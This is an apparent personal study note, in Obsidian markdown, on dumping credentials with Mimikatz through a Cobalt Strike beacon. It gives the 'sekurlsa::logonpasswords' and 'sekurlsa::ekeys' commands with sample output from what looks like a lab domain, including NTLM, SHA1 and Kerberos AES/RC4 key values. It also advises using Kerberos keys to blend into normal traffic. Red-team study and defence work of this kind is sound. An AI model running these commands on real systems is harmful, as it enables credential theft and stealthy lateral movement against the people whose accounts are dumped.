---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[Mimikatz]]  
___

## Description:
Mimikatz is infamous for being able to dump plaintext passwords or password hashes from memory.

This requires local admin privileges on the host.

## Installation
Buillt into CobaltStike



## Commands
Cobalt Strike also has a short-hand command for this called `logonpasswords`.

```
beacon> mimikatz sekurlsa::logonpasswords

Authentication Id : 0 ; 113277 (00000000:0001ba7d)
Session           : Interactive from 1
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 5/24/2021 9:00:11 AM
SID               : S-1-5-21-3263068140-2042698922-2891547269-1122
    msv :   
     [00000003] Primary
     * Username : jking
     * Domain   : DEV
     * NTLM     : 4ffd3eabdce2e158d923ddec72de979e
     * SHA1     : b081158da72409badae7b849d12097f2fa02c119
     * DPAPI    : 4180363cf5b2faa2130098adcb3a1db4
    tspkg : 
    wdigest :   
     * Username : jking
     * Domain   : DEV
     * Password : (null)
    kerberos :  
     * Username : jking
     * Domain   : DEV.CYBERBOTIC.IO
     * Password : (null)
    ssp :   
    credman :

```


### eKeys

This Mimikatz module will dump Kerberos encryption keys. Since most Windows services choose to use Kerberos over NTLM, leveraging these over NTLM hashes makes more sense for blending into normal authentication traffic.

```
beacon> mimikatz sekurlsa::ekeys

Authentication Id : 0 ; 113277 (00000000:0001ba7d)
Session           : Interactive from 1
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 5/24/2021 9:00:11 AM
SID               : S-1-5-21-3263068140-2042698922-2891547269-1122

     * Username : jking
     * Domain   : DEV.CYBERBOTIC.IO
     * Password : (null)
     * Key List :
       aes256_hmac       a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1
       rc4_hmac_nt       4ffd3eabdce2e158d923ddec72de979e
       rc4_hmac_old      4ffd3eabdce2e158d923ddec72de979e
       rc4_md4           4ffd3eabdce2e158d923ddec72de979e
       rc4_hmac_nt_exp   4ffd3eabdce2e158d923ddec72de979e
       rc4_hmac_old_exp  4ffd3eabdce2e158d923ddec72de979e
```






___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (04:06 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
